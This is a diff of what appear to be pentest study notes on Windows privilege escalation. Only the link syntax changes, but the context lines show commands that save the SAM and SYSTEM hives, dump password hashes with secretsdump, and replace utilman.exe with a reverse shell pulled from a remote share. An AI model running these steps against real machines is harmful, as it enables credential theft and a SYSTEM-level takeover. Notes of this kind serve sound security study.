@@ -6,7 +6,7 @@ whoami /priv
 - List of all permission can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
 
 ### SeBackup/SeRestore
-[[Privileges#SeBackup/SeRestore]]
+[SeBackup/SeRestore](Privileges#SeBackup/SeRestore)
 - SYSTEM and SAM hives can be backed up using : 
 ```powershell
 # backup SYSTEM
@@ -15,7 +15,7 @@ reg save HKLM\SYSTEM C:\User\THMBackup\system.hive
 # backup SAM
 reg save HKLM\SAM C:\User\THMBackup\sam.hive
 ```
-- These files can be used to extract hashes of users password using impacket's secretsdump [[Impacket#secretsdump.py]]
+- These files can be used to extract hashes of users password using impacket's secretsdump [secretsdump.py](Impacket#secretsdump.py)
 ```bash
 # Dump the local account hashes using system.hive and sam.hive
 secretsdump.py -system system.hive -sam sam.hive LOCAL
@@ -29,7 +29,7 @@ C:\Windows\System32>
 ```
 
 ### SeTakeOwnership
-[[Privileges#SeTakeOwnership]]
+[SeTakeOwnership](Privileges#SeTakeOwnership)
 - `utilman.exe` is a service tha provides ease of access setting at windows login and runs with SYSTEM privileges.
 - With `SeTakeOwnership` , we can take ownership of the `utilman.exe` executable and replace it with cmd or a reverse shell.
 ```powershell
@@ -46,5 +46,4 @@ copy \\<ip>\public\reverse Utilman.exe
 nv -nvlp 9999
 # After locking the computer and clicking on ease of access button, we get a reverse shell.
 ```
-
 ### SeImpersonate
